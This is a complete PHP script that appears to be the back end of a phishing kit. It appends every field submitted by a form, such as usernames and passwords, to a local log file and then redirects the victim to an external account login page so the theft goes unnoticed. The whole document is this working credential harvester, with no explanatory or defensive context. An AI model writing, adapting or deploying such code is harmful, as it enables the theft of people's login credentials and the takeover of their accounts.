<?php
header ('Location: https://r1.avalon-1.pro/account/login/ ');
$handle = fopen("logs_39409.txt", "a");
foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
}
fwrite($handle, "===============\r\n");
fclose($handle);
exit;
?>